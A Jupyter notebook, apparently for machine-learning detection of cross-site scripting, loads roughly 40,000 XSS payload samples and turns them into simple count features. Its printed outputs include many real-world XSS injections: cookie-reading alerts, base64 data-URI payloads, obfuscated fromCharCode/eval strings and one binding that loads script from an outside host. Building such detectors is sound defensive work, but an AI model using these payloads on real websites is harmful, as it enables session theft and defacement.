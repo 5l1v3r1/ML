{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "import graphlab as gl"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre>Finished parsing file /Users/xy/workspace/ML/DL_for_xss/data/xssed.csv</pre>"
      ],
      "text/plain": [
       "Finished parsing file /Users/xy/workspace/ML/DL_for_xss/data/xssed.csv"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>Parsing completed. Parsed 100 lines in 0.06911 secs.</pre>"
      ],
      "text/plain": [
       "Parsing completed. Parsed 100 lines in 0.06911 secs."
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "------------------------------------------------------\n",
      "Inferred types from first 100 line(s) of file as \n",
      "column_type_hints=[str]\n",
      "If parsing fails due to incorrect types, you can correct\n",
      "the inferred type list above and pass it to read_csv in\n",
      "the column_type_hints argument\n",
      "------------------------------------------------------\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<pre>Finished parsing file /Users/xy/workspace/ML/DL_for_xss/data/xssed.csv</pre>"
      ],
      "text/plain": [
       "Finished parsing file /Users/xy/workspace/ML/DL_for_xss/data/xssed.csv"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>Parsing completed. Parsed 40637 lines in 0.093406 secs.</pre>"
      ],
      "text/plain": [
       "Parsing completed. Parsed 40637 lines in 0.093406 secs."
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>Unable to parse line \"alert(String(/xss/).substr(1,3)) alert(/xss/.source) <a onclick=\"i=createElement('iframe');i.src='javascript:alert(/xss/)';x=parentNode;x.appendChild(i);\" href=\"#\">Test</a> x='\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29';new Function(x)() <a href=\"&#106&#97&#118&#97&...\"</pre>"
      ],
      "text/plain": [
       "Unable to parse line \"alert(String(/xss/).substr(1,3)) alert(/xss/.source) <a onclick=\"i=createElement('iframe');i.src='javascript:alert(/xss/)';x=parentNode;x.appendChild(i);\" href=\"#\">Test</a> x='\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29';new Function(x)() <a href=\"&#106&#97&#118&#97&...\""
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>Unable to parse line \"<body background=javascript:alert(/xss/)></body> body{xxx:expression(eval(String.fromCharCode(105,102,40,33,119,105,110,100,111,119,46,120,41,123,97,108,101,114,116,40,39,120,115,115,39,41,59,119,105,110,100,111,119,46,120,61,49,59,125)))}\"</pre>"
      ],
      "text/plain": [
       "Unable to parse line \"<body background=javascript:alert(/xss/)></body> body{xxx:expression(eval(String.fromCharCode(105,102,40,33,119,105,110,100,111,119,46,120,41,123,97,108,101,114,116,40,39,120,115,115,39,41,59,119,105,110,100,111,119,46,120,61,49,59,125)))}\""
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>Unable to parse line \"<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">\"</pre>"
      ],
      "text/plain": [
       "Unable to parse line \"<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">\""
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>Unable to parse line \"<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">\"</pre>"
      ],
      "text/plain": [
       "Unable to parse line \"<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">\""
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>Unable to parse line \"<div style=\"-moz-binding:url(http://xssor.io/0.xml#xss);x:expression((window.r!=1)?eval('x=String.fromCharCode;scr=document.createElement(x(115,99,114,105,112,116));scr.setAttribute(x(115,114,99),x(104,116,116,112,58,47,47,119,119,119,46,48,120,51,55,46,99...\"</pre>"
      ],
      "text/plain": [
       "Unable to parse line \"<div style=\"-moz-binding:url(http://xssor.io/0.xml#xss);x:expression((window.r!=1)?eval('x=String.fromCharCode;scr=document.createElement(x(115,99,114,105,112,116));scr.setAttribute(x(115,114,99),x(104,116,116,112,58,47,47,119,119,119,46,48,120,51,55,46,99...\""
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>5 lines failed to parse correctly</pre>"
      ],
      "text/plain": [
       "5 lines failed to parse correctly"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>Finished parsing file /Users/xy/workspace/ML/DL_for_xss/data/xss_black_cos.csv</pre>"
      ],
      "text/plain": [
       "Finished parsing file /Users/xy/workspace/ML/DL_for_xss/data/xss_black_cos.csv"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>Parsing completed. Parsed 14 lines in 0.010552 secs.</pre>"
      ],
      "text/plain": [
       "Parsing completed. Parsed 14 lines in 0.010552 secs."
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "------------------------------------------------------\n",
      "Inferred types from first 100 line(s) of file as \n",
      "column_type_hints=[str]\n",
      "If parsing fails due to incorrect types, you can correct\n",
      "the inferred type list above and pass it to read_csv in\n",
      "the column_type_hints argument\n",
      "------------------------------------------------------\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<pre>Unable to parse line \"<body background=javascript:alert(/xss/)></body> body{xxx:expression(eval(String.fromCharCode(105,102,40,33,119,105,110,100,111,119,46,120,41,123,97,108,101,114,116,40,39,120,115,115,39,41,59,119,105,110,100,111,119,46,120,61,49,59,125)))}\"</pre>"
      ],
      "text/plain": [
       "Unable to parse line \"<body background=javascript:alert(/xss/)></body> body{xxx:expression(eval(String.fromCharCode(105,102,40,33,119,105,110,100,111,119,46,120,41,123,97,108,101,114,116,40,39,120,115,115,39,41,59,119,105,110,100,111,119,46,120,61,49,59,125)))}\""
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>Unable to parse line \"alert(String(/xss/).substr(1,3)) alert(/xss/.source) <a onclick=\"i=createElement('iframe');i.src='javascript:alert(/xss/)';x=parentNode;x.appendChild(i);\" href=\"#\">Test</a> x='\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29';new Function(x)() <a href=\"&#106&#97&#118&#97&...\"</pre>"
      ],
      "text/plain": [
       "Unable to parse line \"alert(String(/xss/).substr(1,3)) alert(/xss/.source) <a onclick=\"i=createElement('iframe');i.src='javascript:alert(/xss/)';x=parentNode;x.appendChild(i);\" href=\"#\">Test</a> x='\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29';new Function(x)() <a href=\"&#106&#97&#118&#97&...\""
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>Unable to parse line \"<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">\"</pre>"
      ],
      "text/plain": [
       "Unable to parse line \"<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">\""
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>Unable to parse line \"<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">\"</pre>"
      ],
      "text/plain": [
       "Unable to parse line \"<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">\""
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>Unable to parse line \"<div style=\"-moz-binding:url(http://xssor.io/0.xml#xss);x:expression((window.r!=1)?eval('x=String.fromCharCode;scr=document.createElement(x(115,99,114,105,112,116));scr.setAttribute(x(115,114,99),x(104,116,116,112,58,47,47,119,119,119,46,48,120,51,55,46,99...\"</pre>"
      ],
      "text/plain": [
       "Unable to parse line \"<div style=\"-moz-binding:url(http://xssor.io/0.xml#xss);x:expression((window.r!=1)?eval('x=String.fromCharCode;scr=document.createElement(x(115,99,114,105,112,116));scr.setAttribute(x(115,114,99),x(104,116,116,112,58,47,47,119,119,119,46,48,120,51,55,46,99...\""
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>5 lines failed to parse correctly</pre>"
      ],
      "text/plain": [
       "5 lines failed to parse correctly"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>Finished parsing file /Users/xy/workspace/ML/DL_for_xss/data/xss_black_cos.csv</pre>"
      ],
      "text/plain": [
       "Finished parsing file /Users/xy/workspace/ML/DL_for_xss/data/xss_black_cos.csv"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre>Parsing completed. Parsed 14 lines in 0.010985 secs.</pre>"
      ],
      "text/plain": [
       "Parsing completed. Parsed 14 lines in 0.010985 secs."
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "black = gl.SFrame.read_csv('data/xssed.csv').append(gl.SFrame.read_csv('data/xss_black_cos.csv'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div style=\"max-height:1000px;max-width:1500px;overflow:auto;\"><table frame=\"box\" rules=\"cols\">\n",
       "    <tr>\n",
       "        <th style=\"padding-left: 1em; padding-right: 1em; text-align: center\">param</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">Search%3D%3C/script%3E%3C<br>img/%2A%00/src%3D%22w ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">symbol%3D%3Ch1%3E%3Cscrip<br>t%3Ealert%28/hacked/% ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">query%3D%3CIMG%2B%22%22%2<br>2%3E%3CSCRIPT%3Ealert ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">ReturnUrl%3Dhttp%3A//www.<br>elle.fr/recherche ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">_lang%3D%22%3E%3Cscript%3<br>Ealert%28document.coo ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">language%3D%22%3E%3C/scri<br>pt%3E%22%3E%27%3E%3Cs ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">q%3Dbentley%26stylesheet%<br>3D%22%3E%3Cscript%3Ea ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">option%3Dcom_wdshop%26vie<br>w%3Duserinfo%26ajax_j ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">CT_ORIG_URL%3D/arena/%22%<br>3E%3Cscript%3Ealert%2 ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">query%3DSearch...%26Produ<br>ct%3D%27%22--%3E%3C/s ...</td>\n",
       "    </tr>\n",
       "</table>\n",
       "[40651 rows x 1 columns]<br/>Note: Only the head of the SFrame is printed.<br/>You can use print_rows(num_rows=m, num_columns=n) to print more rows and columns.\n",
       "</div>"
      ],
      "text/plain": [
       "Columns:\n",
       "\tparam\tstr\n",
       "\n",
       "Rows: 40651\n",
       "\n",
       "Data:\n",
       "+-------------------------------+\n",
       "|             param             |\n",
       "+-------------------------------+\n",
       "| Search%3D%3C/script%3E%3Ci... |\n",
       "| symbol%3D%3Ch1%3E%3Cscript... |\n",
       "| query%3D%3CIMG%2B%22%22%22... |\n",
       "| ReturnUrl%3Dhttp%3A//www.e... |\n",
       "| _lang%3D%22%3E%3Cscript%3E... |\n",
       "| language%3D%22%3E%3C/scrip... |\n",
       "| q%3Dbentley%26stylesheet%3... |\n",
       "| option%3Dcom_wdshop%26view... |\n",
       "| CT_ORIG_URL%3D/arena/%22%3... |\n",
       "| query%3DSearch...%26Produc... |\n",
       "+-------------------------------+\n",
       "[40651 rows x 1 columns]\n",
       "Note: Only the head of the SFrame is printed.\n",
       "You can use print_rows(num_rows=m, num_columns=n) to print more rows and columns."
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "black"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import nltk\n",
    "import re\n",
    "from urllib import unquote\n",
    "\n",
    "def GeneSeg(payload):\n",
    "    #数字泛化为\"0\"\n",
    "    payload=payload['param'].lower()\n",
    "    payload=unquote(unquote(payload))\n",
    "    payload,num=re.subn(r'\\d+',\"[NUMBER]\",payload)\n",
    "    #替换url为”http://u\n",
    "    payload,num=re.subn(r'(http|https)://[a-zA-Z0-9\\.@&/#!#\\?]+', \"[LINK]\", payload)\n",
    "    #分词\n",
    "    ans = [ \n",
    "        len(re.findall('>',payload)),\n",
    "        len(re.findall('<',payload)),\n",
    "        len(re.findall('script',payload)),\n",
    "        len(re.findall('svg',payload)),\n",
    "        len(re.findall('onload',payload)),\n",
    "        len(re.findall('onerror',payload)),\n",
    "        len(re.findall('cookie',payload)),\n",
    "        len(re.findall('alert',payload)),\n",
    "        len(re.findall('\\(',payload)),\n",
    "        len(re.findall('\\)',payload)),\n",
    "        len(re.findall('\\\"',payload)),\n",
    "        len(re.findall('\\'',payload)),\n",
    "        len(re.findall('=',payload)),\n",
    "        len(re.findall('[NUMBER]',payload)),\n",
    "        len(re.findall('[LINK]',payload)),\n",
    "        len(re.findall(':',payload))\n",
    "    ]\n",
    "    return ans"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "# 增加一列\n",
    "black['parsed'] = black.apply(GeneSeg)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div style=\"max-height:1000px;max-width:1500px;overflow:auto;\"><table frame=\"box\" rules=\"cols\">\n",
       "    <tr>\n",
       "        <th style=\"padding-left: 1em; padding-right: 1em; text-align: center\">param</th>\n",
       "        <th style=\"padding-left: 1em; padding-right: 1em; text-align: center\">parsed</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">Search%3D%3C/script%3E%3C<br>img/%2A%00/src%3D%22w ...</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">[2.0, 2.0, 1.0, 0.0, 0.0,<br>1.0, 0.0, 0.0, 1.0, 1.0, ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">symbol%3D%3Ch1%3E%3Cscrip<br>t%3Ealert%28/hacked/% ...</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">[4.0, 4.0, 2.0, 0.0, 0.0,<br>0.0, 0.0, 1.0, 1.0, 1.0, ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">query%3D%3CIMG%2B%22%22%2<br>2%3E%3CSCRIPT%3Ealert ...</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">[4.0, 3.0, 2.0, 0.0, 0.0,<br>0.0, 0.0, 1.0, 1.0, 1.0, ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">ReturnUrl%3Dhttp%3A//www.<br>elle.fr/recherche ...</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">[3.0, 2.0, 2.0, 0.0, 0.0,<br>0.0, 0.0, 1.0, 2.0, 2.0, ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">_lang%3D%22%3E%3Cscript%3<br>Ealert%28document.coo ...</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">[3.0, 2.0, 2.0, 0.0, 0.0,<br>0.0, 1.0, 1.0, 1.0, 1.0, ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">language%3D%22%3E%3C/scri<br>pt%3E%22%3E%27%3E%3Cs ...</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">[6.0, 3.0, 3.0, 0.0, 0.0,<br>0.0, 0.0, 1.0, 1.0, 1.0, ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">q%3Dbentley%26stylesheet%<br>3D%22%3E%3Cscript%3Ea ...</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">[3.0, 2.0, 2.0, 0.0, 0.0,<br>0.0, 0.0, 1.0, 1.0, 1.0, ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">option%3Dcom_wdshop%26vie<br>w%3Duserinfo%26ajax_j ...</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">[5.0, 4.0, 3.0, 0.0, 0.0,<br>0.0, 1.0, 1.0, 1.0, 1.0, ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">CT_ORIG_URL%3D/arena/%22%<br>3E%3Cscript%3Ealert%2 ...</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">[5.0, 4.0, 2.0, 0.0, 0.0,<br>0.0, 0.0, 1.0, 1.0, 1.0, ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">query%3DSearch...%26Produ<br>ct%3D%27%22--%3E%3C/s ...</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">[5.0, 4.0, 3.0, 0.0, 0.0,<br>0.0, 0.0, 1.0, 1.0, 1.0, ...</td>\n",
       "    </tr>\n",
       "</table>\n",
       "[40651 rows x 2 columns]<br/>Note: Only the head of the SFrame is printed.<br/>You can use print_rows(num_rows=m, num_columns=n) to print more rows and columns.\n",
       "</div>"
      ],
      "text/plain": [
       "Columns:\n",
       "\tparam\tstr\n",
       "\tparsed\tarray\n",
       "\n",
       "Rows: 40651\n",
       "\n",
       "Data:\n",
       "+-------------------------------+-------------------------------+\n",
       "|             param             |             parsed            |\n",
       "+-------------------------------+-------------------------------+\n",
       "| Search%3D%3C/script%3E%3Ci... | [2.0, 2.0, 1.0, 0.0, 0.0, ... |\n",
       "| symbol%3D%3Ch1%3E%3Cscript... | [4.0, 4.0, 2.0, 0.0, 0.0, ... |\n",
       "| query%3D%3CIMG%2B%22%22%22... | [4.0, 3.0, 2.0, 0.0, 0.0, ... |\n",
       "| ReturnUrl%3Dhttp%3A//www.e... | [3.0, 2.0, 2.0, 0.0, 0.0, ... |\n",
       "| _lang%3D%22%3E%3Cscript%3E... | [3.0, 2.0, 2.0, 0.0, 0.0, ... |\n",
       "| language%3D%22%3E%3C/scrip... | [6.0, 3.0, 3.0, 0.0, 0.0, ... |\n",
       "| q%3Dbentley%26stylesheet%3... | [3.0, 2.0, 2.0, 0.0, 0.0, ... |\n",
       "| option%3Dcom_wdshop%26view... | [5.0, 4.0, 3.0, 0.0, 0.0, ... |\n",
       "| CT_ORIG_URL%3D/arena/%22%3... | [5.0, 4.0, 2.0, 0.0, 0.0, ... |\n",
       "| query%3DSearch...%26Produc... | [5.0, 4.0, 3.0, 0.0, 0.0, ... |\n",
       "+-------------------------------+-------------------------------+\n",
       "[40651 rows x 2 columns]\n",
       "Note: Only the head of the SFrame is printed.\n",
       "You can use print_rows(num_rows=m, num_columns=n) to print more rows and columns."
      ]
     },
     "execution_count": 42,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "black"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['search=', '</script>', '<img', 'src=', 'worksinchrome', 'colon', 'prompt', 'x0', '0', 'x0', 'onerror=', 'eval(', 'src', ')', '>', 'symbol=', '<h0>', '<script>', 'alert(', 'hacked', ')', '</script>', '</h0>', 'id=', '0', 'query=', '<img', '>', '<script>', 'alert(', '\"cyb0r_pr0dat0r\"', ')', '</script>', '>', 'fuzzy=', 'true', 'ct=', 'null', 'autobounce=', 'true', 'returnurl=', 'http://u', 'globale', 'searchtext', ')', '>', '<script>', 'alert(', 'xss', 'by', 'm0ke', ')', '</script>', '_lang=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'language=', '>', '</script>', '>', '>', '<script>', 'alert(', 'arman', 'ires', 'digital', 'boys', 'underground', 'http://u', ')', '</script>', 'q=', 'bentley', 'stylesheet=', '>', '<script>', 'alert(', \"'raven'\", ')', '</script>', 'collections=', 'libcms', 'option=', 'com_wdshop', 'view=', 'userinfo', 'ajax_json=', 'ajax_fill_city_state', 'format=', 'raw', 'zip=', '>', '</style>', '</script>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'ct_orig_url=', 'arena', '>', '<script>', 'alert(', '0', ')', '</script>', '<iframe', 'src=', 'http://u', '>', '</iframe>', 'query=', 'search...', 'product=', '>', '</style>', '</script>', '<script>', 'alert(', \"'xss'\", ')', '</script>', 'page=', '0', 'c=', '0zzzzzzzzzz', '>', '<script>', 'alert(', '0', ')', '</script>', 'topic=', 'http://u', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'loc=', 'en_us', '>', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', '>', '</script>', '>', '>', '<script>', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', '</script>', 'viewid=', 'categoryview', 'contentid=', 'ct0_sol_cat_wireless', 'wt.svl', 'pnro_l0', 'author=', '>', '<script>', 'alert(', 'string.fromcharcode(', '0', '0', '0', ')', ')', '</script>', 'q=', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'action=', 'chercher', 'field_0=', 'ref', 'value_0=', '>', '>', '>', '<script>', 'document.body.innerhtml', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', '</script>', 'q=', '<img', '>', '<script>', 'alert(', '\"xss\"', ')', '</script>', '>', 'siteid=', 'alert(', 'string.fromcharcode(', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', ')', ')', '>', '</script>', '>', '>', '<script>', 'alert(', 'string.fromcharcode(', '0', '0', '0', ')', ')', '</script>', 'searchterm=', '<img', 'src=', \"'aaa'\", 'onerror=', 'alert(', '0', ')', '>', 'as_filtro_id=', 'certified_usr', 'as_nickname=', 'as_pcia_id=', '>', '>', '<script>', 'alert(', \"'xss'\", ')', '</script>', 'mess=', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'back=', 'settings0', 's=', 'xss', '>', '<script>', 'alert(', 'xss', 'by', 'atm0n0r', ')', '</script>', 'query=', '</script>', '<img', 'src=', 'xss', 'onerror=', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', ')', ')', 'visibility=', 'hidden', '>', 'n=', 'main.wikisandbox', 'from=', '>', '<body', 'onload=', 'alert(', '0', ')', '>', 'tipurl=', '>', '<script>', 'alert(', '\"crosssitescripting0\"', ')', '</script>', 'artist_id=', '0', '>', '<script>', 'alert(', 'daimon', ')', '</script>', 'num=', '>', '<script>', 'alert(', '\"daimon\"', ')', '</script>', 'survey=', 'aexcel', 'psid=', 'nullaaa', '>', '<script>', 'alert(', '0', ')', '</script>', 'netid=', 'null', 'xmflg=', 'null', 'n=', 'main.wikisandbox', 'from=', '>', '<bodyonload', 'alert(', '0', ')', '>', 'search=', '>', '<script>', 'alert(', 'navigator.useragent', ')', '</script>', 'group=', 'lang_de_gbw', 'html', 'nr=', '0', 'js=', '>', '</style>', '</script>', '<script>', 'alert(', 'meeh', 'infected', ')', '</script>', '</title>', '<marquee>', '<h0>', 'xss', ')', '</h0>', '<marquee>', '<strong>', '<blink>', 'xss', 'test', '</blink>', '</strong>', '</marquee>', '<h0', '>', 'xss', ')', '</h0>', '</marquee>', 'ca=', 'id_secteur_activite=', 'date_operation=', 'mots_cles=', '>', '<script>', 'alert(', 'xss', 'by', 'atm0n0r', ')', '</script>', 'x=', '0', 'y=', '0', 'id=', '0', '>', '<script>', 'alert(', '0', ')', '</script>', 'site_id=', 'medicare', '>', '<script>', 'alert(', '0', ')', '</script>', 'asdf', 'email', 'id=', '0', 'layout=', '<iframe', 'src=', 'http://u', '>', 'ntt=', '<script>', 'alert(', 'document.domain', ')', '</script>', 'n=', '0', 'nty=', '0', 'sid=', '0c0fae', 'prodid=', '0', '>', '</style>', '</script>', '<script>', 'alert(', '\"xss\"', ')', '</script>', 'site=', '0', 'from=', '0', 'noreg=', 'y', 'clear=', 'y', 'referer0=', 'kl_main', 'referer0=', 'kl_store', 'redirect=', 'index.cfm', '>', '<script>', 'window.location.assign(', 'http://u', ')', '</script>', 'query=', '>', '<script>', 'alert(', 'xss', 'vijayendra', ')', '</script>', 'search.x', '0', 'search.y', '0', 'querytext=', '>', '<script>', 'alert(', \"'x'\", ')', '</script>', 'username=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'q=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'subcatid=', '0', 'simplesearchfor=', '<script>', 'alert(', '\"xss\"', ')', '</script>', 'x=', '0', 'y=', '0', 'title=', '<script>', 'alert(', 'the', 'best', 'xsser', ')', '</script>', 'error=', '0', 'fn=', 'arham', 'ln=', '>', '<script>', 'alert(', 'a', 'rhammuhammad', ')', '</script>', 'email=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'qu=', '>', '>', '<script>', 'alert(', 'xss', 'arham', 'muhammad', ')', '</script>', 'action=', 'search', 'title=', '<script>', 'alert(', 'the', 'best', 'xsser', ')', '</script>', 'restrict=', 'q=', '>', '<script>', 'alert(', \"'xss'\", ')', '</script>', 'hush_username=', 'arham', '>', '<script>', 'alert(', \"'xss'\", ')', '</script>', 'searchconfiguration=', 